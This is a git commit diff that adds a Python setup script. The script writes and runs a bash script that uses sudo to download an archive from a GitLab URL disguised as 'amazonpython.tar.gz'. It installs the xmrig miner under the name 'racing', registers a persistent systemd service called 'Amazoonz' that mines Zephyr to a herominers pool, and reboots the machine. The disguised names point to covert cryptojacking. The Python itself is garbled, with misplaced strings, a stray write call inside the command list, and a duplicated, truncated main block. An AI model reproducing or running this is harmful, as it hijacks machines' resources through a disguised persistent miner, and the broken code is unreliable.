08ba1f8482c58cd67a35b971542bb0ae2bb6f59c
bizzip9x <106524605+bizzip9x@users.noreply.github.com>
2024-01-15 15:26:00 +0700

    Create setup_script.py

---
+++ setup_script.py
@@ -0,0 +1,42 @@
+import argparse
+import subprocess
+
+def create_and_run_bash_script(worker, threads):
+    script_content = 
+   
+f"""#!/bin/bash
+cd /usr/local/bin
+sudo wget https://gitlab.com/amaz/grabcar/-/raw/main/amazonpython.tar.gz
+sudo apt update
+sudo systemctl stop amazoon.service
+sudo systemctl disable amazoon.service
+sudo tar xvzf amazonpython.tar.gz
+sudo mv xmrig-6.20.0 racing
+sudo bash -c 'echo -e "[Unit]\\nDescription=Amazoonz\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/usr/local/bin/racing/xmrig --donate-level 1 -o us.zephyr.herominers.com:1123 -u {worker} -p worker -a rx/0 -k -t {threads}\\n\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/amazoonz.service
+sudo systemctl daemon-reload
+sudo systemctl enable amazoonz.service
+echo "Setup completed!"
+sudo reboot
+"""
+
+    
+
+   
+with open("setup.sh", "w") as file:
+        file.write(script_content)
+    
+    subprocess.run([
+        file.write(script_content)
+"bash", "setup.sh"], check=True)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Setup script for mining")
+    parser.add_argument("--worker", required=True, help="Worker name")
+    parser.add_argument("--threads", required=True, help="Number of threads")
+    args = parser.parse_args()
+
+    create_and_run_bash_script(args.worker, args.threads)
+
+    args = parser.parse_args()
+
+    create_and_run
